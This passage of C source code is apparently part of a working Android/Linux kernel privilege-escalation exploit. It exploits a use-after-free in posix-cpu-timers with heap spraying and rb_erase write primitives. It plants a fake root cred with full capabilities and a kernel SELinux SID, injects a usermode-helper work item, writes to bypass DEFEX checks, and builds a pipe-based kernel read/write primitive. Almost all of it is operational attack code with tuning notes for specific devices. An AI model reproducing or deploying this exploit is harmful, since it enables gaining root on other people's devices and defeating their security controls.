        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    g_slide = site0 - STATIC_TIMER_SITE;
    g_slide_set = 1;
    /*
     * The caller picks a static target before the slide is known, so on the
     * very first plant of a boot every kernel-image target was off by the
     * slide (observed as rb_erase faulting at core_pattern's unslid address).
     * Fix it up here, where the slide has just been derived, and only when the
     * caller could not have applied it already.
     */
    if (!slide_was_set && target >= 0xffffffc000000000ULL)
        target += (unsigned long long)g_slide;
    if (n > 0)
    {
        /*
         * Only trust an unambiguous capture: the window must contain
         * exactly one task_struct alloc for our pid (T's fork).  Anything
         * else means the scan is matching something we do not understand,
         * and writing through a wrong "task" address corrupts kernel
         * memory -- so treat it as no capture and hold instead.
         */
        int tcnt = scan_task_allocs(raw, (size_t)n, (int)getpid(), &T_task,
                                    TASK_SITE_STATIC +
                                        (unsigned long long)g_slide);

        if (tcnt != 1 || !T_task || (T_task & 0x3f))
        {
            logf("[-] plant%d task capture ambiguous (n=%d task=%#llx)\n",
                 tag, tcnt, T_task);
            T_task = 0;
        }
    }
    logf("[plant%d] T=%d task=%#llx slide=%#llx\n", tag, T, T_task, g_slide);
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < 0xffffff0000000000ULL ||
            base > 0xffffffc000000000ULL)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xffffffc000000000) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    /* Static target: resolve against the slide learned above. */
    if (static_target)
        target = static_target + (unsigned long long)g_slide;

    unsigned long long page = V & ~0x1fffULL;
    {
        size_t off = (size_t)((V & 0x1fff) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (mode == 2)
        {
            /*
             * The posix-cpu-timers exit loop keeps deleting head->next and
             * timerqueue_del() first does head->next = rb_next(node).
             * rb_next() returns NULL only for an RB_EMPTY_NODE, i.e. when
             * the parent color equals the node address.  Therefore the
             * value rb_erase() writes into task->cred (the parent color)
             * has to be the node address itself, and the fake cred must be
             * overlaid on the stale node.  That takes the
             * WARN_ON_ONCE(RB_EMPTY_NODE) in timerqueue_del; calling it is
             * safe because the fake path pre-zeroes panic_on_warn.
             *
             * After the erase (6.1 cred layout):
             *   +0x00 usage|uid = parent color A (uid is dirty)
             *   +0x08 gid|suid  = target, written by __rb_change_child
             *   +0x10 sgid|euid = rb_left (target)
             * uid and euid are repaired by later zero plants; suid/sgid
             * keep the target value, which is harmless for the exec.
             */
            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                       0x100, 0x0};
            int fit = 0;

            if (off + 0xb0 > 0x2000)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > 0x2000)
                    continue;
                if (b < off + 0xb0 && off < b + 0x40)
                    continue;
                blob = b;
                fit = 1;
                break;
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            {
                unsigned char *pc = payload + off;

                build_payload(payload, off, V + 0x78, target);
                /* The node fields at +0x00 and +0x10 are already set; fill
                 * in the rest of the fake cred around them. */
                *(unsigned long long *)(pc + 0x28) = FULLCAP; /* inherit */
                *(unsigned long long *)(pc + 0x30) = FULLCAP; /* permitted */
                *(unsigned long long *)(pc + 0x38) = FULLCAP; /* effective */
                *(unsigned long long *)(pc + 0x40) = FULLCAP; /* bset */
                *(unsigned long long *)(pc + 0x48) = FULLCAP; /* ambient */
                *(unsigned long long *)(pc + 0x78) = page + blob;
                *(unsigned long long *)(pc + 0x80) =
                    ROOT_USER_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x88) =
                    INIT_USER_NS_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x90) =
                    INIT_UCOUNTS_STATIC + g_slide;
                *(unsigned long long *)(pc + 0x98) =
                    INIT_GROUPS_STATIC + g_slide;
                *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                    SELINUX_SID_KERNEL;                    /* osid */
                *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
                    SELINUX_SID_KERNEL;                    /* sid */
                logf("[+] plant%d fake cred at=%#llx blob=%#zx "
                     "sec=%#llx\n", tag, V + 0x78, blob, page + blob);
            }
        }
        else if (mode == 3)
        {
            /*
             * UMH injection (fusion-s24u port).  The fake work_struct lives
             * at page+ROOT_UMH_WORK_OFF and umh_kernel_data at
             * page+ROOT_UMH_DATA_OFF, both fully under our control.  The
             * rb node is prepared with:
             *   parent_color = &work->entry  -> the primitive writes this
             *                                    value to rb_left (the
             *                                    worklist next field)
             *   rb_left      = worklist      -> worklist->next = &entry
             *   side effect: *(parent+8) = work+0x10 sets entry.prev
             * Side effects all land inside our page or restore the empty
             * list, so nothing outside is corrupted.
             */
            unsigned long long page = V & ~0x1fffULL;
            unsigned long long work = page + ROOT_UMH_WORK_OFF;
            unsigned long long entry = work + WORK_ENTRY_OFF;
            unsigned long long data = page + ROOT_UMH_DATA_OFF;
            unsigned char *pc = payload + off;
            struct umh_kernel_data ud;

            memset(&ud, 0, sizeof(ud));
            snprintf(ud.path, sizeof(ud.path), "%s", ROOT_UMH_PATH);
            snprintf(ud.path + 16, sizeof(ud.path) - 16, "%s",
                 ROOT_UMH_ARG);
            snprintf(ud.uid, sizeof(ud.uid), "%u", (unsigned)getuid());
            {
                unsigned long long completion_addr =
                    data + __builtin_offsetof(struct umh_kernel_data,
                                              completion);
                unsigned long long path_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, path);
                unsigned long long envp_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, envp);

                ud.completion.next = completion_addr +
                    __builtin_offsetof(struct umh_completion, next);
                ud.completion.prev = ud.completion.next;
                ud.argv[0] = path_addr;
                ud.argv[1] = path_addr + 16;
                ud.argv[2] = 0;
                ud.argv[3] = 0;
                ud.envp[0] = 0;
                (void)envp_addr;
            }
            memcpy(payload + ROOT_UMH_DATA_OFF, &ud, sizeof(ud));
            /* fake work_struct: data = fake_pwq|1<<4|5 (pwq ptr + color 1 +
             * WORK_STRUCT_PENDING_LY|NO_POOL sentinel), entry.next/prev =
             * worklist (self-empty on list_del), func = UMH exec work. */
            {
                unsigned long long fake_pwq = page + ROOT_UMH_PWQ_OFF;
                unsigned long long *w = (unsigned long long
                                         *)(payload + ROOT_UMH_WORK_OFF);

                memset(w, 0, 48);
                w[0] = fake_pwq | 0x15;    /* data: pwq|color<<4|5 */
                w[1] = target;             /* entry.next = worklist */
                w[2] = target;             /* entry.prev = worklist */
                w[3] = UMH_EXEC_WORK_STATIC + g_slide; /* func */
                /* fake pwq: ->wq must be the real system_unbound_wq so the
                 * flags read succeeds; refcnt/colors are page-local. */
                {
                    unsigned long long *p = (unsigned long long
                                             *)(payload + ROOT_UMH_PWQ_OFF);

                    memset(payload + ROOT_UMH_PWQ_OFF, 0, 0x80);
                    p[PWQ_POOL_OFF / 8] = 0;         /* pool: unused here */
                    p[PWQ_WQ_OFF / 8] =
                        SYSTEM_UNBOUND_WQ_STATIC + g_slide;
                    *(unsigned int *)(payload + ROOT_UMH_PWQ_OFF +
                                      PWQ_WORK_COLOR_OFF) = 1;
                    *(unsigned int *)(payload + ROOT_UMH_PWQ_OFF +
                                      PWQ_NR_IN_FLIGHT_OFF + 4) = 1;
                    *(unsigned int *)(payload + ROOT_UMH_PWQ_OFF +
                                      PWQ_NR_ACTIVE_OFF) = 1;
                    *(unsigned int *)(payload + ROOT_UMH_PWQ_OFF +
                                      PWQ_MAX_ACTIVE_OFF) = 8;
                }
            }
            /* fake subprocess_info laid out at the work_struct: work(48)
             * then complete/path/argv/envp/wait/retval/init/cleanup/data
             * (fusion-s24u layout, verified against this kernel). */
            {
                unsigned long long *s = (unsigned long long
                                         *)(payload + ROOT_UMH_WORK_OFF);
                unsigned long long completion_addr =
                    data + __builtin_offsetof(struct umh_kernel_data,
                                              completion);
                unsigned long long path_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, path);
                unsigned long long argv_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, argv);
                unsigned long long envp_addr =
                    data + __builtin_offsetof(struct umh_kernel_data, envp);

                /* s[0..5] are work->data/entry/func (already set). */
                s[6] = completion_addr;     /* complete */
                s[7] = path_addr;           /* path */
                s[8] = argv_addr;           /* argv */
                s[9] = envp_addr;           /* envp */
                /* wait = UMH_WAIT_EXEC(1)? fusion uses 0 (async): the
                 * kernel kfree's the info itself after exec. */
                *(int *)(payload + ROOT_UMH_WORK_OFF + 48 + 32) = 0;
            }
            /* rb node: parent_color = entry (color bits 0) */
            build_payload(payload, off, entry, target);
            (void)pc;
            logf("[+] plant%d umh work=%#llx entry=%#llx data=%#llx "
                 "func=%#llx\n", tag, work, entry, data,
                 UMH_EXEC_WORK_STATIC + g_slide);
        }
        else if (mode == 4)
        {
            /*
             * Arbitrary "non-zero pointer" write: rb_erase writes
             * parent_color (= our page address, non-zero) into rb_left
             * (the target).  parent = parent_color & ~3 points into our
             * page, so the __rb_change_child side effect
             * (*(parent+8) = rb_left) lands on payload+0x1008 — harmless.
             * Used for DEFEX gates that test != 0.
             */
            unsigned long long page = V & ~0x1fffULL;

            build_payload(payload, off, page + 0x1000, target);
            logf("[+] plant%d arb write target=%#llx value=%#llx\n",
                 tag, target, page + 0x1000);
        }
        else if (mode == 6)
        {
            /*
             * Pipe read/write primitive (RiosWesley design).  rb_erase
             * writes our page address into pipe->bufs; the parent+8 side
             * effect lands on fake buffer 0 (unused because pipe->tail is
             * 1).  The fake pipe_buffer at node+0x28 describes the target
             * RAM page, so pipe_read() copies kernel memory to userspace
             * and a CAN_MERGE pipe_write() merges into it.
             */
            unsigned long long page = V & ~0x1fffULL;
            unsigned long long spage = 0;
            unsigned int poff = 0;

            /*
             * From here on pipe->bufs may point into the keep pool (the
             * erase stores this page's node address), so that pool has to
             * survive until the caller confirms the bootstrap merge moved
             * bufs to its own page.  g_pool is untouched and stays
             * drainable, which is what keeps the repair path bounded.
             */
            g_keep_bufs = 1;
            g_pipe_restored = 0;

            if (g_pipe_self)
            {
                spage = spage_of_linear(page);
                poff = 0;
            }
            else if (g_pipe_target_page)
            {
                spage = g_pipe_target_page;
                poff = g_pipe_target_off;
            }
            else
            {
                /* default target: the page containing system_unbound_wq */
                unsigned long long sym_phys = g_kimage_phys +
                    (SYSTEM_UNBOUND_WQ_STATIC - KERNEL_VA_BASE);

                spage = spage_of_linear(g_base + sym_phys);
                poff = (unsigned int)(sym_phys & 0xfffULL);
                logf("[+] readwq phys=%#llx spage=%#llx poff=%#x\n",
                     sym_phys, spage, poff);
            }

            if (off + PIPE_BUF_FAKE_OFF + 0x28 > 0x2000)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            /*
             * Self-parent node (same trick as the fake cred): rb_erase
             * writes the node address (V+0x78) into pipe->bufs.  The fake
             * pipe_buffer array therefore starts at the node, so slot k
             * lives at node + k*0x28.
             *
             * Fill slots 1..15 with the same descriptor.  pipe_write's
             * merge path picks bufs[(head-1) & 15] and pipe_read picks
             * bufs[tail & 15]; the prime sequence normally leaves
             * head=2/tail=1, but a single misplaced slot used to turn a
             * stray index into a zeroed descriptor and pipe_read then
             * dereferenced ops == NULL (observed oops: pipe_read+0x104,
             * ldr x8,[x8] with x8 = buf->ops = 0).  Slot 0 is never
             * written: it overlaps the rb_node itself (rb_left holds the
             * target), so it cannot hold a valid struct page pointer; the
             * prime-state check in umhpipe_main keeps tail/head away from
             * it.
             */
            /*
             * Write path: rb_erase's __rb_change_child only reaches the
             * caller's target when the node's parent_color is 0.  With a
             * self-parent (the old build_payload(..., V + 0x78, target)) it
             * rewrites parent->rb_left inside this payload instead, so
             * pipe->bufs never changed -- which is exactly what the kprobe
             * and FIONREAD=9 showed: the merge landed in the prime's real
             * buffer, not in our array.
             *
             * parent_color = 0  -> parent = NULL -> __rb_change_child writes
             *                      *(root=target) = node->rb_right
             * rb_right      = V+0x78 -> the value stored into pipe->bufs
             * rb_left       = 0      -> keeps the !tmp branch
             */
            /*
             * Arbitrary 8-byte write derived from the disassembly of
             * posix_cpu_timers_exit: rb_erase(node, root=tsk+0x740) then runs
             * __rb_change_child(node, child=node->rb_right, parent, root).
             * With parent != 0 and parent->rb_left != node it stores
             * child into parent->rb_right, i.e. into *(parent + 8).
             *
             * So to write "V+0x78" into A (= pipe->bufs):
             *   parent_color = A - 8       -> parent = A - 8
             *   node->rb_right = V + 0x78  -> the value stored
             *   node->rb_left  = 0         -> takes the !tmp branch
             * The reference's payload used parent = V+0x78 (self), so the
             * store landed at V+0x80 inside its own payload -- which is why
             * pipe->bufs never changed there either.
             */
            /*
             * Reference shape (19c70f0/s928b): self-parent.  build_payload
             * sets __rb_parent_color = V+0x78 (== node) and rb_left = target,
             * rb_right = 0.  posix_cpu_timers_exit's rb_next() sees the
             * RB_EMPTY_NODE marker (pc == node), returns NULL (clean loop
             * termination), and rb_erase takes Case B (`rb_right == 0`):
             * `str x9,[x10]` at rb_erase+0x88 stores pc (V+0x78) into
             * rb_left (target) -- i.e. *(target) = V+0x78.  This is the write
             * path proven by the oops `pc : rb_erase+0x88, fault @ core_pattern`.
             * The derived Case-A shape also writes the target but makes rb_next
             * return the node itself (rb_right = V+0x78), re-walking the same
             * node and tripping the empty-node check on the second pass.
             */
            if (getenv("SAMTIMER_WSHAPE") &&
                !strcmp(getenv("SAMTIMER_WSHAPE"), "self"))
            {
                build_payload(payload, off, V + 0x78, target);
            }
            else if (getenv("SAMTIMER_WSHAPE") &&
                     !strcmp(getenv("SAMTIMER_WSHAPE"), "zwrite"))
            {
                build_payload(payload, off, target - 0x08, 0);
            }
            else if (getenv("SAMTIMER_WSHAPE") &&
                     !strcmp(getenv("SAMTIMER_WSHAPE"), "canary"))
            {
                build_payload(payload, off, 0xdead0000dead0000ULL, 0);
            }
            else if (getenv("SAMTIMER_WSHAPE") &&
                     !strcmp(getenv("SAMTIMER_WSHAPE"), "zero"))
            {
                build_payload(payload, off, 0, target);
            }
            else
            {
                build_payload(payload, off, V + 0x78, target);
            }
            /*
             * `off` IS the node offset within the slab:
             *   off = (V & 0x1fff) + 0x78
             * and the value stored into pipe->bufs is V + 0x78, whose offset
             * within this order-1 slab is exactly `off`.  So the fake
             * pipe_buffer array (base = node) has slot k at `off + k*0x28`,
             * and slot 0 at `off` is the rb_node itself (never filled).
             * 19c70f0/s928b both fill slot 1 at off + 0x28; the earlier
             * "+ 0x78" here double-counted the node offset and left the real
             * slot 1 as a zero descriptor -- which is the observed
             * pipe_read+0x104 oops (buf->ops == NULL).
             */
            for (size_t k = 1; k < 64; k++)
            {
                size_t so = off + k * PIPE_BUF_FAKE_OFF;

                if (so + PIPE_BUF_FAKE_OFF > 0x2000)
                    break;
                /*
                 * len MUST be 0 in the bootstrap (write) mode.  pipe_write's
                 * merge path writes at "buf->offset + buf->len", not at
                 * buf->offset, and only merges while that sum plus the data
                 * stays inside the page.  With len 0x1000 the sum is
                 * pipe_off + 0x1000 > PAGE_SIZE, so the merge is skipped and
                 * write() silently takes the allocating path: it returns 8
                 * (so every "write n=8" check passed) while pipe->bufs is
                 * never touched -- exactly what the post-merge probe showed
                 * (probe = mark_va shifted one byte with the pipe's 'A' prime
                 * byte in front, i.e. an unrelated page).
                 *
                 * Read descriptors do need a non-zero len (a 0-length buffer
                 * is released by pipe_read), which is why the read path fills
                 * 0x1000.  The s928b reference uses pipe_off/len=0 here.
                 */
                fill_fake_pipe_buf(payload, so, spage, poff,
                                   g_pipe_write ? 0 : 0x1000,
                                   g_pipe_write ? 0x10 : 0);
            }
            logf("[+] plant%d pipe page=%#llx node=%#llx poff=%#x "
                 "spage=%#llx ops=%#llx\n", tag, page, V + 0x78, poff,
                 spage, ANON_PIPE_BUF_OPS_STATIC + g_slide);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx fake=%#llx node=%#llx pfn=%#llx "
             "slab=%#llx slide=%#llx recs=%d slab_own=%d/32 base=%#llx\n",
             tag, V, V + 0x78, V + 0x78, pfn, slab_pfn, g_slide,
             nrec, slab_own, g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        /* The stride must come from the pool the threads actually write to,
         * and it must be non-zero: `w % a->sock_count` in spray_thread()
         * divides by it.  ensure_pool() only guarantees g_pool, so a partly
         * created keep pool (fd limit) would otherwise index past it or
         * SIGFPE the spray threads. */
        int (*spool)[2] = (mode == 2 || mode == 6) ? g_fpool : g_pool;
        /*
         * Mode-6 (pipe bootstrap / marker verify) attempts are retried many
         * times and each pins its spray until pipe->bufs moves, so they get
         * a smaller budget: the logs show the reclaim page is taken within
         * the first milliseconds of the abort (hit after 0-14 ms), which
         * 3000 tight writes cover, and the 3000-write paced tail still spans
         * a late free.  48 MiB per attempt instead of 125 MiB buys three
         * times the retries for the same memory.
         */
        int pre = (mode == 6) ? 3000 : SPRAY_PRE;
        int post = (mode == 6) ? 3000 : SPRAY_POST;
        int spool_n = (mode == 2 || mode == 6) ? g_fpool_n : g_pool_n;
        int per = spool_n / SPRAY_THREADS;

        if (per <= 0)
        {
            logf("[-] plant%d no spray sockets for mode=%d (pool=%d)\n",
                 tag, mode, spool_n);
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            free(payload);
            return;
        }
        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            /* Both "must outlive the plant" cases use the keep pool:
             * mode 2 (task->cred -> fake cred page) and mode 6
             * (pipe->bufs -> reclaimed node page). */
            args[i].pool = spool;
            args[i].pool_n = spool_n;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            args[i].pre = pre;
            args[i].post = post;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }
    /*
     * The abort path frees the timers in exit_itimers() during do_exit,
     * not at the later release_task() reap.  Start the spray now, before
     * the exec, so an allocation is in flight when the slab reaches the
     * buddy; the threads are paced to stay active for several seconds.
     */
    atomic_store(&g_burst, 1);
    /*
     * Phase 2 stays gated: only the real page-free observation (or the
     * root drop_caches) releases it.  Releasing it here made the whole
     * 4000+12000 burst finish before the abort, so free_seen=1 still
     * produced burst hit=0.
     */

    /*
     * Drain the per-CPU trace while the exec/abort and the paced spray are
     * in flight.  Waiting for the zombie first loses the victim's
     * page_alloc/free records: the 8 MB ring wraps during the ~2 s abort
     * window and the 15 s post-zombie scan then sees nothing.
     */
    g_pre_hit = 0;
    struct free_info fi;

    memset(&fi, 0, sizeof(fi));
    {
        long t0 = now_ms();

        while (now_ms() - t0 < 4000)
        {
            siginfo_t tmp;

            memset(&tmp, 0, sizeof(tmp));
            if (waitid(P_PID, (id_t)T, &tmp,
                       WEXITED | WNOHANG | WNOWAIT) == 0 &&
                tmp.si_pid == T)
            {
                drop_caches_root();
                break;
            }
            for (int cpu = 0; cpu < 8 && !g_pre_hit; cpu++)
            {
                long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
                int ord = 0;

                if (m <= 0)
                    continue;
                if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn, &ord))
                    g_pre_hit = 1;
                if (ord && !g_carrier_alt)
                    g_carrier_alt = ord;
                scan_free_records(raw, (size_t)m, etid, slab_pfn, &fi);
                if (!free_seen && fi.want_free)
                {
                    free_seen = 1;
                    atomic_store(&g_burst2, 1);
                    logf("[+] plant%d early page_free seen; phase2 open\n",
                         tag);
                }
            }
            usleep(1000);
        }
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        /*
         * The trigger never exited, so the exec/kill chain stalled and
         * timer-go was already written.  If the exec thread (etid) still
         * exists, de_thread() has not run: exec has not reached
         * posix_cpu_timers_exit(), the timers are still live and a normal
         * kill/reap will dequeue them through siglock, without touching a
         * stale node.  That makes the retry safe.
         */
        int exec_tid_alive = etid &&
                             syscall(SYS_tgkill, T, etid, 0) == 0;

        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        drain_spray(mode == 2);
        trace_stop();
        if (exec_tid_alive)
        {
            /*
             * The exec thread is still alive, so de_thread() has not run and
             * the timers are still live: SIGKILL runs the ordinary exit
             * path, exit_itimers() dequeues them through siglock, and the
             * queue is clean at reap -- no stale node exists, so the reap
             * cannot erase foreign pointers.  The old repair here was nine
             * plants (3 slots x 3 attempts) of pure cost, and each extra
             * plant is another roll of the same dice that can panic the
             * device; kill and reap directly instead.
             */
            int st = 0;

            kill(T, SIGKILL);
            logf("[-] plant%d no zombie (code=%d status=%d, etid=%d "
                 "still alive); killed, reaping directly\n",
                 tag, si.si_code, si.si_status, etid);
            (void)waitpid(T, &st, 0);
            res->retry = 1;
            return;
        }
        logf("[-] plant%d no zombie (code=%d status=%d); repairing+reaping\n",
             tag, si.si_code, si.si_status);
        /* Kill first so no live timer can re-arm a queue leftmost while the
         * repair writes run; cleanup only happens at reap on this kernel. */
        kill(T, SIGKILL);
        repair_zombie(T, T_task, raw, tag);
        /*
         * Retryable: the victim has been repaired and reaped (or held and
         * recorded), so nothing stale is left behind.  Returning without
         * this bit made stage_write() give up after a single trigger that
         * never produced its zombie in 15 s -- observed on the first plant
         * of a dry run, where the five repair plants that followed all hit.
         */
        res->retry = 1;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    /*
     * Distinguish "exec completed, then the process was killed" from
     * "exec aborted in begin_new_exec() before the late timer cleanup".
     * The exec thread is named "yexec"; a completed execve overwrites
     * task->comm with the new executable's name.  On the abort path comm
     * stays "yexec", which means the last posix_cpu_timers_exit() was
     * skipped and the zombie's queue still holds the stale, freed timer.
     */
    char cbuf[64] = "?";
    {
        char cpath[64];
        int cfd;

        snprintf(cpath, sizeof(cpath), "/proc/%d/comm", (int)T);
        cfd = open(cpath, O_RDONLY);
        if (cfd >= 0)
        {
            int cn = (int)read(cfd, cbuf, sizeof(cbuf) - 1);

            close(cfd);
            if (cn > 0)
            {
                while (cn > 0 && (cbuf[cn - 1] == '\n' || cbuf[cn - 1] == 0))
                    cn--;
                cbuf[cn] = 0;
            }
        }
        logf("[plant%d] zombie comm=%s locker_iters=%lu (yexec => exec "
             "aborted before cleanup)\n", tag, cbuf,
             (unsigned long)atomic_load(&g_locker_iters));
    }
    /*
     * CLD_KILLED is the abort, full stop.  comm is not a usable discriminator
     * any more: with the CoreDumping handshake the exec thread is killed
     * *before* de_thread() swaps the pids, so a real abort reports
     * comm="timer".  A completed exec never reaches here (it exits, si_code
     * CLD_EXITED), and T is a zombie in every path, so treating a stray
     * SIGKILL as a victim only wastes a plant -- its timer queue was cleaned
     * at exit, the reap finds nothing and the plant misses safely.
     */
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        drain_spray(mode == 2);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap code=%d status=%d not SIGKILL; repairing+reaping\n",
             tag, si.si_code, si.si_status);
        repair_zombie(T, T_task, raw, tag);
        return;
    }
    /*
     * Order-1 reclaim only: android.hardwar consumes order-0 pages as soon as
     * V's slab splits, so an order-0 spray loses the race.  An order-1 frag
     * claims the whole freed slab before it ever splits.  Phase 1 must already
     * be spraying when the free happens (no free-detect delay), so keep both
     * phases running continuously.
     */
    atomic_store(&g_burst, 1);
    /*
     * Phase 2 is released here as well, not just on the free record: the
     * k_itimer free is RCU-deferred, so the record may be emitted by a
     * ksoftirqd/other task and never match the scan.  The threads only
     * reach phase 2 after their phase-1 writes, so this turns the old
     * "wait for a record that never comes" stall into a paced tail.
     */
    atomic_store(&g_burst2, 1);
    long t1 = now_ms();
    int hit = g_pre_hit;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
            int ord = 0;

            if (m <= 0)
                continue;
            scan_free_records(raw, (size_t)m, etid, slab_pfn, &fi);
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn, &ord))
            {
                hit = 1;
                dump_victim_trace(slab_pfn);
            }
            else if (!free_seen && fi.want_free)
            {
                free_seen = 1;
                /*
                 * Release phase 2 the instant the victim page is free.  The
                 * order-0 pipe-page spray that used to run here was dropped:
                 * the vivo GKI port measured 0 hits over 12,306 order-0 pipe
                 * pages against just-freed order-1 slab pages (PCP and the
                 * order-0 free lists are far larger than any burst we can
                 * afford), and doing it inline delayed the order-1 burst that
                 * actually wins.
                 */
                atomic_store(&g_burst2, 1);
                logf("[+] plant%d page_free seen at %ldms; phase2 open\n",
                     tag, now_ms() - t1);
            }
            if (ord && !g_carrier_alt)
                g_carrier_alt = ord;
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    /*
     * Do NOT drain yet on the success path: the rb_erase write fires from
     * release_task() during waitpid(T) below, so the payload page at V+0x78
     * must stay allocated until then.
     */
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
        int ord = 0;

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn, &ord))
            hit = 1;
        if (ord && !g_carrier_alt)
            g_carrier_alt = ord;
    }
    /*
     * `discarded` is the SLUB/do_exit signal: how many order-1 pages the
     * victim's own exit returned to the buddy.  Near zero means the timer
     * batch never left the partial list (min_partial/might_sleep path), and
     * the spray cannot win regardless of volume -- park instead of retrying
     * blindly.
     */
    logf("[+] plant%d free_seen=%d burst hit=%d carrier_alt=%d "
         "discarded=%d free_any=%d after %ldms\n", tag, free_seen, hit,
         g_carrier_alt, fi.order1, fi.order1_any, now_ms() - t1);
    dump_victim_trace(slab_pfn);
    if (!hit)
    {
        /*
         * The victim slab can stay in SLUB's partial list instead of
         * returning to the buddy allocator, so the spray never sees its
         * pfn.  Keep the zombie (the stale node is not erased while it is
         * unreaped) and let stage_write pick a new victim.
         */
        logf("[-] plant%d burst missed; repairing+reaping; retryable\n", tag);
        /* No erase will use this payload (the stale node is not the one the
         * repair touches), so reclaim the spray memory before the repair's
         * own plants run against empty pools. */
        drain_spray(mode == 2);
        repair_zombie(T, T_task, raw, tag);
        res->retry = 1;
        return;
    }

    usleep(1000);
    int st = 0, reaped = 0;

    /*
     * The trigger child is normally SIGKILLed by its killer helper once the
     * exec thread dies, which runs the task cleanup (the rb_erase write).
     * On this kernel that helper sometimes never sees the exec thread die, so
     * a blocking waitpid hangs the whole exploit and the stuck process
     * eventually panics the device.  Wait with a timeout instead and SIGKILL
     * the child ourselves if needed: SIGKILL still runs do_exit and thus the
     * cleanup_timerqueue write, while never hanging.
     */
    /*
     * Reap on a CPU other than the one that allocated the victim timer.
     * A local free returns the object to the per-CPU SLUB slab, which then
     * stays cached and never reaches the buddy allocator (free_seen=0,
     * burst hit=0).  A remote free of the now-empty slab is what lets the
     * spray's order-1 allocations reclaim the page.
     */
    pin((g_cpu == 2) ? 3 : 2);
    for (int i = 0; i < 300 && !reaped; i++)
    {
        pid_t rp = waitpid(T, &st, WNOHANG);

        if (rp == T)
        {
            reaped = 1;
